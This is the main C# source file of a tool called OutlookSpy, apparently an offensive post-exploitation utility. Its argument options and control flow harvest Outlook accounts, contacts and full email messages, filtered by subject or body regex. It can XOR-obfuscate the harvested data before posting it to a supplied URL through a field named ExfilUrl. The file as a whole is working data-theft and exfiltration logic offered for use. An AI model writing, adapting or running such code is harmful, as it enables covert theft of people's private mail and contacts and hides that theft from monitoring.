using ArgumentParser;
using System;
using System.Data;

namespace OutlookSpy
{
	class Program
	{
		static void Main(string[] args)
		{
			ArgParse argparse = new ArgParse
			(
					new ArgItem("action", "a", true, "Action to be taken", "", ArgParse.ArgParseType.Choice, new string[] { "accounts", "all", "contacts", "list_fields", "messages_meta", "message_single", "message_full" }),
					new ArgItem("entry-id", "e", false, "Outlook generated entry id of the record to fetch.", "", ArgParse.ArgParseType.String),
					new ArgItem("max-records", "m", false, "Number of messages to retrieve", "1000", ArgParse.ArgParseType.String),
					new ArgItem("body-contains-regex", "br", false, "Regex for searching email", "", ArgParse.ArgParseType.String),
					new ArgItem("body-contains", "bc", false, "String for searching email body (insensitive).", "", ArgParse.ArgParseType.String),
					new ArgItem("subject-contains-regex", "sr", false, "Filters messages if the subject contains the specified value.", "", ArgParse.ArgParseType.String),
					new ArgItem("subject-contains", "sc", false, "Filters messages if the subject contains the specified value.", "", ArgParse.ArgParseType.String),
					new ArgItem("max-message-size", "fs", false, "Restricts gathered messages to the specified size in bytes.", "", ArgParse.ArgParseType.String),
					new ArgItem("output", "o", false, "Output type: csv,json", "json", ArgParse.ArgParseType.Choice, new string[] { "csv", "json" }),
					new ArgItem("url", "u", false, "url where data will be posted", "", ArgParse.ArgParseType.Url),
					new ArgItem("xor-key", "x", false, "Xor data before transmitting", "", ArgParse.ArgParseType.String),
					new ArgItem("fields", "f", false, "Fields to include in final output.  If not specified, all fields are returned", "", ArgParse.ArgParseType.String)
			);

			argparse.parse(args);
			
			string action = argparse.Get<string>("action");

			App app = new App();
			app.EntryId = argparse.Get<string>("entry-id");
			app.MaxRecords = argparse.Get<int>("max-records", 1000);
			app.BodyContains = argparse.Get<string>("body-contains");
			app.BodyContainsRegex = argparse.Get<string>("body-contains-regex");
			app.SubjectContains = argparse.Get<string>("subject-contains");
			app.SubjectContainsRegex = argparse.Get<string>("subject-contains-regex");
			app.MaxMessageSize = argparse.Get<long>("max-message-size", 1024*4);
			app.OutputFormat = argparse.Get<string>("output", "json");
			app.ExfilUrl = argparse.Get<string>("url");
			app.XorKey = argparse.Get<string>("xor-key");

			Messages messagesObject = new Messages(app);
			Accounts accounts = new Accounts(app);
			Contacts contacts = new Contacts(app);

			string result = "";
			switch (action.ToLower())
			{
				case "list_fields":
					messagesObject.ListMailItems();
					result = "";
					for (int t = 0; t < app.OutlookDataSet.Tables.Count; t++)
					{
						DataTable table = app.OutlookDataSet.Tables[t];
						Console.WriteLine(table.TableName);
						Console.WriteLine("-------------------------");
						for (int c = 0; c < table.Columns.Count; c++)
						{
							DataColumn column = table.Columns[c];
							Console.WriteLine(column.ColumnName);
						}
						Console.WriteLine("");
					}
					break;
				case "contacts":
					contacts.ListContacts();
					result = (app.OutputFormat.ToLower() == "json") ? Utils.ToJSONDataTable(app.OutlookDataSet.Tables["contacts"]) : Utils.ToCSV(app.OutlookDataSet.Tables["contacts"]); 
					break;
				case "message_full":
					messagesObject.ListMailItems();
					result = (app.OutputFormat.ToLower() == "json") ? Utils.ToJSONDataTable(app.OutlookDataSet.Tables["messages"]) : Utils.ToCSV(app.OutlookDataSet.Tables["messages"]);
					break;
				case "message_single":
					messagesObject.ListMailItems();
					result = Utils.ToJSONDataTable(app.OutlookDataSet.Tables["messages"]);
					break;
				case "all":
					messagesObject.ListMailItems();
					accounts.ListAccounts();
					contacts.ListContacts();
					result = (app.OutputFormat.ToLower() == "json") ? Utils.ToJSON(app.OutlookDataSet) : Utils.DataSetToCSV(app.OutlookDataSet);
					break;
				case "messages_meta":
					messagesObject.ListMailItems();
					result = (app.OutputFormat.ToLower() == "json") ? Utils.ToJSON(app.OutlookDataSet) : Utils.DataSetToCSV(app.OutlookDataSet);
					break;
				default:
					accounts.ListAccounts();
					result = (app.OutputFormat.ToLower() == "json") ? Utils.ToJSONDataTable(app.OutlookDataSet.Tables["accounts"]) : Utils.ToCSV(app.OutlookDataSet.Tables["accounts"]);
					break;
			}

			if(app.XorKey != null && app.XorKey.Length > 0)
			{
				result = Utils.XORData(app.XorKey, result);
			}

			if (app.ExfilUrl == null || app.ExfilUrl.Length == 0)
			{
				if(result.Length > 0)
				{
					Console.WriteLine(result);
				}
			}
			else
			{
				Utils.ExfilData(app.ExfilUrl, result);
			}

			Console.ReadLine();
		}
	}
}